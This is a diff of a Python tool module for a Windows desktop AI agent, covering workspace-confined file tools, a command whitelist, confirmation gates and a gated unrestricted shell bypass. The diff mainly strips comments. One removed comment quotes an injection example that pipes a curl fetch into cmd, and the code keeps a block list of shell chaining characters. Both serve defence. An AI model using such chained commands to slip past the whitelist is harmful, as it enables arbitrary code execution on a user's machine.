@@ -1,14 +1,6 @@
-"""Windows-specific tool functions for the client-hosted agent.
-
-Each returns ``{"_ui_components": [<astralprims dicts>], "_data": {...}}`` — the
-same shape backend agents return — so results render natively in the desktop
-client (and as HTML on the web). These execute on the host the agent runs on.
-
-The coding tools (read_file / write_file / edit_file / run_command / run_shell)
-are **workspace-confined**, **per-tool permission-gated** (by the orchestrator's
-ToolPermissionManager via the declared scope), **PHI-gated client-side**
-(fail-closed — PHI never leaves the machine), and **audited** on every action
-(local hash-chained JSONL + the orchestrator's own tool audit event).
+"""Windows tool implementations (file, command, clipboard, system-info) called by
+win_agent/agent.py's dispatch; coding tools are workspace-confined, per-action
+confirmed via astral_client/confirm.py, PHI-gated, and audit-logged.
 """
 
 from __future__ import annotations
@@ -19,21 +11,9 @@ import shlex
 import subprocess
 from typing import Any, Dict, List, Optional
 
-# Client-side PHI pre-filter + audit log (fail-closed / fail-open respectively).
-# Imported lazily-safe: these modules live alongside the agent in the bundle.
 from astral_client import audit_log, phi_gate
 
 
-# --------------------------------------------------------------------------- #
-# Per-action confirmation gate (feature 039 UX).
-#
-# Mutating/exec tools ask the user for an explicit Allow before touching disk
-# or running a command. The real bridge (astral_client.confirm) shows a native
-# Qt dialog on the GUI thread. When the bridge is not attached (headless agent
-# run, or a test that hasn't stubbed it), the default is FAIL-CLOSED: deny.
-# Tests monkeypatch ``_confirm_action`` to auto-allow so the existing pure-
-# Python suite stays green without a Qt display.
-# --------------------------------------------------------------------------- #
 def _confirm_action(
     *,
     tool: str,
@@ -45,8 +25,8 @@ def _confirm_action(
 ) -> bool:
     try:
         from astral_client import confirm as _c
-    except Exception:  # noqa: BLE001 — confirm module optional in minimal envs
-        return False  # fail-closed: no GUI bridge => no mutating action
+    except Exception:  # noqa: BLE001
+        return False
     return _c.confirm_action(
         tool=tool, path=path, command=command, preview=preview, summary=summary
     )
@@ -59,11 +39,6 @@ def _alert(message: str, variant: str = "success", title: str = None) -> dict:
     return a
 
 
-# --------------------------------------------------------------------------- #
-# Per-dispatch context (set by agent.dispatch before invoking a tool).
-# Holds the actor (from the token), the MCP request's correlation_id, and the
-# AuditLogger. Existing tools ignore it; the coding tools use it for audit.
-# --------------------------------------------------------------------------- #
 _CTX: Dict[str, Any] = {"actor": "unknown", "correlation_id": "", "audit": None}
 
 
@@ -93,18 +68,10 @@ def _audit(
         )
 
 
-# --------------------------------------------------------------------------- #
-# Workspace confinement — the primary filesystem safety boundary.
-# --------------------------------------------------------------------------- #
-# In-process override set by the desktop GUI (the user's chosen workspace
-# folder). Wins over the env var so a runtime directory change takes effect
-# immediately. None => fall back to ASTRAL_WORKSPACE_DIR (the launch default).
 _WORKSPACE_OVERRIDE: Optional[str] = None
 
 
 def set_workspace_override(path: Optional[str]) -> None:
-    """Set (or clear) the in-process workspace root used by every file/command
-    tool. Called by the desktop GUI when the user picks/changes the folder."""
     global _WORKSPACE_OVERRIDE
     if not path:
         _WORKSPACE_OVERRIDE = None
@@ -131,11 +98,6 @@ def _ensure_workspace() -> str:
 
 
 def _confined(path: str) -> Optional[str]:
-    """Resolve ``path`` and return its realpath iff inside the workspace, else None.
-
-    Refuses traversal (``..``), absolute paths outside the workspace, and symlink
-    escape (realpath resolves symlinks before the prefix check).
-    """
     if not path:
         return None
     root = workspace_root()
@@ -150,15 +112,10 @@ def _confined(path: str) -> Optional[str]:
     return None
 
 
-# --------------------------------------------------------------------------- #
-# Coding tools
-# --------------------------------------------------------------------------- #
-
-_READ_CAP = int(os.getenv("WIN_READ_MAX_BYTES", str(2 * 1024 * 1024)))  # 2 MB
+_READ_CAP = int(os.getenv("WIN_READ_MAX_BYTES", str(2 * 1024 * 1024)))
 
 
 def read_file(path: str = "", **kwargs) -> Dict[str, Any]:
-    """Read a text file inside the workspace (PHI-gated before return)."""
     args = {"path": path}
     rp = _confined(path)
     if rp is None or not os.path.isfile(rp):
@@ -205,7 +162,6 @@ def read_file(path: str = "", **kwargs) -> Dict[str, Any]:
 
 
 def write_file(path: str = "", content: str = "", **kwargs) -> Dict[str, Any]:
-    """Create or overwrite a file inside the workspace."""
     args = {"path": path, "length": len(content or "")}
     rp = _confined(path)
     if rp is None:
@@ -213,7 +169,6 @@ def write_file(path: str = "", content: str = "", **kwargs) -> Dict[str, Any]:
         return _ok(
             [_alert("I can only write files inside your Astral workspace.", "error")]
         )
-    # Per-action confirmation: show the path + content, require an explicit Allow.
     if not _confirm_action(
         tool="write_file",
         path=os.path.relpath(rp, workspace_root()),
@@ -246,7 +201,6 @@ def write_file(path: str = "", content: str = "", **kwargs) -> Dict[str, Any]:
 
 
 def edit_file(path: str = "", old: str = "", new: str = "", **kwargs) -> Dict[str, Any]:
-    """Replace the first occurrence of ``old`` with ``new`` in a workspace file."""
     args = {"path": path, "old_len": len(old or ""), "new_len": len(new or "")}
     if not old:
         _audit("edit_file", args, "refused", detail="empty old text")
@@ -276,7 +230,6 @@ def edit_file(path: str = "", old: str = "", new: str = "", **kwargs) -> Dict[st
                 ]
             )
         count = text.count(old)
-        # Per-action confirmation: show the exact old → new edit before applying.
         preview = f"--- find ---\n{old}\n\n+++ replace with ---\n{new or ''}"
         if not _confirm_action(
             tool="edit_file",
@@ -317,8 +270,6 @@ def edit_file(path: str = "", old: str = "", new: str = "", **kwargs) -> Dict[st
         return _ok([_alert(f"Couldn't edit the file: {exc}", "error")])
 
 
-# Whitelist of executables permitted for run_command (inside the workspace).
-# Anything else is refused unless the dangerous bypass (run_shell) is enabled.
 _CMD_WHITELIST = {
     "git",
     "python",
@@ -353,18 +304,11 @@ _CMD_WHITELIST = {
 _CMD_TIMEOUT = int(os.getenv("WIN_CMD_TIMEOUT", "60"))
 _CMD_MAX_BYTES = int(os.getenv("WIN_CMD_MAX_BYTES", str(1024 * 1024)))
 
-# Shell metacharacters that CHAIN, REDIRECT or SUBSTITUTE another command.
-# `_exec` runs through the shell (several whitelisted entries — dir/type/copy/
-# del/move/ren/echo — are cmd.exe builtins with no executable to invoke), so
-# the whitelist check on argv[0] alone was not a boundary: `git status && curl
-# http://x | cmd` passes it as "git" and then the shell runs the rest. Anything
-# carrying one of these is refused and pointed at the bypass tool, which is
-# what the two-tier design intends to be the only route to arbitrary execution.
+# Blocks shell chaining the argv[0] whitelist alone can't stop
 _SHELL_METACHARS = ("&", "|", ";", "<", ">", "`", "$(", "\n", "\r", "%")
 
 
 def _shell_metachar(command: str) -> str:
-    """The first chaining/redirecting metacharacter in ``command``, else ""."""
     for token in _SHELL_METACHARS:
         if token in command:
             return token
@@ -376,7 +320,6 @@ def _head(s: str, n: int) -> str:
 
 
 def run_command(command: str = "", **kwargs) -> Dict[str, Any]:
-    """Run a whitelisted command inside the workspace (PHI-gated output)."""
     args = {"command": command}
     if not command or not command.strip():
         _audit("run_command", args, "refused", detail="empty command")
@@ -389,10 +332,6 @@ def run_command(command: str = "", **kwargs) -> Dict[str, Any]:
     if not parts:
         _audit("run_command", args, "refused", detail="empty after parse")
         return _ok([_alert("Give me a command to run.", "warning")])
-    # Refuse shell chaining BEFORE the whitelist check: the whitelist inspects
-    # argv[0] only, but `_exec` hands the whole string to the shell, so a
-    # metacharacter would smuggle an arbitrary second command past a
-    # whitelisted first one.
     metachar = _shell_metachar(command)
     if metachar:
         _audit("run_command", args, "refused",
@@ -421,7 +360,6 @@ def run_command(command: str = "", **kwargs) -> Dict[str, Any]:
                 )
             ]
         )
-    # Per-action confirmation: show the exact command + workspace cwd.
     if not _confirm_action(
         tool="run_command",
         command=command,
@@ -440,12 +378,6 @@ def run_command(command: str = "", **kwargs) -> Dict[str, Any]:
 
 
 def run_shell(command: str = "", **kwargs) -> Dict[str, Any]:
-    """DANGEROUS BYPASS — run an arbitrary shell command (full access).
-
-    Gated behind ASTRAL_DANGEROUS_BYPASS=1 (checked by the agent before it ever
-    advertises/calls this) AND a per-call native confirmation (the agent prompts
-    the user with the exact command). Always audited as ``dangerous_bypass``.
-    """
     args = {"command": command}
     if os.getenv("ASTRAL_DANGEROUS_BYPASS", "0") not in ("1", "true", "yes", "on"):
         _audit("run_shell", args, "refused", detail="bypass flag not set")
@@ -461,8 +393,6 @@ def run_shell(command: str = "", **kwargs) -> Dict[str, Any]:
     if not command or not command.strip():
         _audit("run_shell", args, "refused", detail="empty command")
         return _ok([_alert("Give me a command to run.", "warning")])
-    # Per-call native confirmation — the exact command, with DANGEROUS framing.
-    # This is the per-action gate the docstring has always promised.
     if not _confirm_action(
         tool="run_shell",
         command=command,
@@ -484,7 +414,6 @@ def run_shell(command: str = "", **kwargs) -> Dict[str, Any]:
                 )
             ]
         )
-    # No cwd confinement for the bypass — that's the whole point. PHI still gated.
     return _exec(command, args, cwd=None, event_class="dangerous_bypass")
 
 
@@ -598,13 +527,7 @@ def _ok(components: List[dict], data: dict = None) -> Dict[str, Any]:
     return {"_ui_components": components, "_data": data or {}}
 
 
-# --------------------------------------------------------------------------- #
-# system info
-# --------------------------------------------------------------------------- #
-
-
 def get_system_info(**kwargs) -> Dict[str, Any]:
-    """Report this Windows machine's OS, CPU, memory and disk usage."""
     info = {
         "OS": f"{platform.system()} {platform.release()}",
         "Version": platform.version(),
@@ -664,13 +587,7 @@ def get_system_info(**kwargs) -> Dict[str, Any]:
     )
 
 
-# --------------------------------------------------------------------------- #
-# clipboard
-# --------------------------------------------------------------------------- #
-
-
 def read_clipboard(**kwargs) -> Dict[str, Any]:
-    """Return the current text contents of the Windows clipboard."""
     text = _clip_get()
     if not text:
         return _ok([_alert("The clipboard is empty (or holds non-text data).", "info")])
@@ -687,7 +604,6 @@ def read_clipboard(**kwargs) -> Dict[str, Any]:
 
 
 def write_clipboard(text: str = "", **kwargs) -> Dict[str, Any]:
-    """Copy ``text`` to the Windows clipboard."""
     if not text:
         return _ok([_alert("Nothing to copy — provide text.", "warning")])
     _clip_set(text)
@@ -709,7 +625,7 @@ def _clip_get() -> str:
 
         return pyperclip.paste() or ""
     except Exception:
-        try:  # stdlib fallback
+        try:
             out = subprocess.run(
                 ["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
                 capture_output=True,
@@ -734,13 +650,7 @@ def _clip_set(text: str) -> None:
         )
 
 
-# --------------------------------------------------------------------------- #
-# notifications
-# --------------------------------------------------------------------------- #
-
-
 def notify(title: str = "AstralDeep", message: str = "", **kwargs) -> Dict[str, Any]:
-    """Show a native Windows toast notification."""
     t = (title or "AstralDeep").replace("'", "")
     m = (message or "").replace("'", "")
     ps = (
@@ -767,13 +677,7 @@ def notify(title: str = "AstralDeep", message: str = "", **kwargs) -> Dict[str, 
         return _ok([_alert(f"Couldn't show a notification: {exc}", "error")])
 
 
-# --------------------------------------------------------------------------- #
-# open path / url
-# --------------------------------------------------------------------------- #
-
-
 def open_path(path: str = "", **kwargs) -> Dict[str, Any]:
-    """Open a file, folder, or URL with its default Windows handler."""
     if not path:
         return _ok([_alert("Provide a path or URL to open.", "warning")])
     try:
@@ -782,19 +686,13 @@ def open_path(path: str = "", **kwargs) -> Dict[str, Any]:
 
             webbrowser.open(path)
         else:
-            os.startfile(os.path.expandvars(os.path.expanduser(path)))  # noqa: S606 (Windows)
+            os.startfile(os.path.expandvars(os.path.expanduser(path)))  # noqa: S606
         return _ok([_alert(f"Opened: {path}", "success")], {"opened": path})
     except Exception as exc:
         return _ok([_alert(f"Couldn't open '{path}': {exc}", "error")])
 
 
-# --------------------------------------------------------------------------- #
-# list directory
-# --------------------------------------------------------------------------- #
-
-
 def list_directory(path: str = "", **kwargs) -> Dict[str, Any]:
-    """List the entries of a folder inside the workspace (defaults to the workspace root)."""
     args = {"path": path}
     _ensure_workspace()
     rp = _confined(path) if path else workspace_root()
@@ -888,7 +786,6 @@ TOOL_REGISTRY: Dict[str, dict] = {
             },
         },
     },
-    # --- coding tools (feature 039) --- #
     "read_file": {
         "function": read_file,
         "scope": "tools:read",
